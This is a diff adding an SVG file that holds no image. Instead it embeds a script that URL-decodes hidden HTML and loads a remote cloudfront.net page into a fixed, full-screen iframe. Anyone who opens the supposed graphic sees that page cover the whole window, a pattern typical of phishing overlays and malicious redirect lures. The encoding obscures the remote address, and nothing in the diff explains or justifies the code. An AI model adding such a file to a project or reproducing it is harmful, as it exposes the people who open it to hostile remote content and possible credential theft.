@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+<foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml" style="width:100vw;height:100vh;margin:0;padding:0"><iframe id="jxframe" style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:0;margin:0;padding:0"></iframe></div></foreignObject>
+<script>
+<![CDATA[
+document.getElementById("jxframe").setAttribute("srcdoc", decodeURIComponent("%3C!DOCTYPE%20html67%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%3Cstyle%3E%0Abody%20%7B%0A%20%20margin%3A%200%3B%0A%7D%0Aiframe%20%7B%0A%20%20width%3A%20100vw%3B%0A%20%20height%3A%20100vh%3B%0A%20%20border%3A%20none%3B%0A%7D%0A%3C%2Fstyle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%0A%3Ciframe%20src%3D%22https%3A%2F%2Fd2mxyt8j2p6hed.cloudfront.net%2F%22%3E%3C%2Fiframe%3E%0A%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A"));
+]]>
+</script>
+</svg>
